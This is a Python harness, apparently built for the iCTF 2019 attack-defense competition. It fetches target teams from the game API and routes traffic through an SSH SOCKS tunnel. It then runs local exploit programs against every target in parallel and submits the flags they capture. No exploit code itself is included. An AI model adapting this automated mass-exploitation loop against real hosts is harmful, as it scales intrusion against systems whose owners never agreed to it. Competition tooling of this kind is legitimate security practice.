#!/usr/bin/env python3

import collections
import multiprocessing
import subprocess
import time

# ssh -D 1337 -q -C -N -f <host>
import socks
import socket
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 1337)
socket.socket = socks.socksocket

from swpag_client import Team

GAME_URL = 'http://api.ictf2019.net/' # Don't forget tailing /
FLAG_TOKEN = 'TODO'

ready_exploits = {'example'}

def targets(*, team):
    services = team.get_service_list()
    service_flag_ids = collections.defaultdict(set)
    while True:
        for service in services:
            service_id = service['service_id']
            service_name = service['service_name']
            if service_name in ready_exploits:
                for target in team.get_targets(service_id):
                    flag_id = target['flag_id']
                    target_host = target['hostname']
                    if (target_host, flag_id) not in service_flag_ids[service_name]:
                        yield service_name, target_host, flag_id
                        service_flag_ids[service_name].add((target_host, flag_id))
        time.sleep(1)


def exploit(path, target_host, flag_id, *, team):
    def team_ip(team_host):
        # 172.31.129.1 (team1) ... 172.31.129.254 (team254) ... 172.31.130.1 (team255) ...
        team_number = int(team_host[4:])
        minor = ((team_number - 1) % 254) + 1
        major = (team_number // 255) + 129
        return f'172.31.{major}.{minor}'
    target_host = team_ip(target_host)

    exploit_descrption = (path, target_host, flag_id)
    print(f"[{exploit_descrption}]: Exploiting...", flush=True)

    try:
        result = subprocess.run([f'./{path}', target_host, flag_id],
                                capture_output=True,
                                timeout=60,
                                check=True)


    except subprocess.TimeoutExpired as e:
        print(f"[{exploit_descrption}]: Timeout", flush=True)
        return

    except subprocess.CalledProcessError as e:
        print(f"[{exploit_descrption}]: Error ({e.returncode})", flush=True)
        return

    flag = result.stdout.strip()
    print(f"[{exploit_descrption}]: Got flag: {flag})", flush=True)

    result = team.submit_flag([flag.decode()])
    print(f"[{exploit_descrption}]: Exploited {flag} ({result})", flush=True)
    return


def main():
    team = Team(GAME_URL, FLAG_TOKEN)

    for service_name, target_host, flag_id in targets(team=team):
        multiprocessing.Process(target=exploit,
                                args=(service_name, target_host, flag_id),
                                kwargs=dict(team=team)) \
                       .start()


if __name__ == '__main__':
    main()
